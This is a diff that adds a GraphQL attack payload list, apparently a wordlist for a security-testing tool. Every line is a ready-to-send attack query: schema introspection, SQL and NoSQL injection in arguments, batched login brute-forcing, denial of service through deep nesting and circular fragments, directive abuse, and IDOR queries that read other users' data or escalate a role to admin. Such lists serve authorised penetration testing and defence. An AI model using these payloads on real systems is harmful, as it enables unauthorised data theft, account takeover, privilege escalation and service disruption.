@@ -1,0 +1,41 @@
+# Introspection - full schema
+{__schema{types{name,fields{name,args{name,type{name}}}}}}
+{__schema{queryType{name},mutationType{name},subscriptionType{name},types{name,kind,fields{name,type{name,kind,ofType{name}}}}}}
+{__schema{directives{name,description,locations,args{name,type{name}}}}}
+
+# Introspection - type enumeration
+{__type(name:"User"){name,fields{name,type{name}}}}
+{__type(name:"Query"){fields{name,description,args{name,type{name,kind}}}}}
+{__type(name:"Mutation"){fields{name,args{name,type{name,kind}}}}}
+
+# Field suggestion abuse
+{user{idz}}
+{passwor}
+
+# Injection - SQL via arguments
+{user(id:"1 OR 1=1"){name,email}}
+{user(name:"admin' OR '1'='1"){id,email,role}}
+mutation{login(username:"admin' OR '1'='1",password:"x"){token}}
+
+# Injection - NoSQL via arguments
+{user(filter:{username:{$ne:""},password:{$ne:""}}){id,name}}
+
+# Query batching
+[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"},{"query":"{user(id:3){name}}"}]
+[{"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}]
+
+# DoS - deeply nested queries
+{user{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}
+query{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}
+
+# Fragment-based attacks
+fragment Full on User{name,email,role,password}query{user(id:1){...Full}}
+fragment A on User{friends{...B}}fragment B on User{friends{...A}}query{user(id:1){...A}}
+
+# Directive abuse
+{user(id:1){name,email @include(if:true),password @include(if:true)}}
+{user(id:1){name @deprecated(reason:"test")}}
+
+# Authorization bypass - IDOR
+{user(id:2){id,name,email,role,ssn}}
+mutation{updateUser(id:2,input:{role:"admin"}){id,role}}
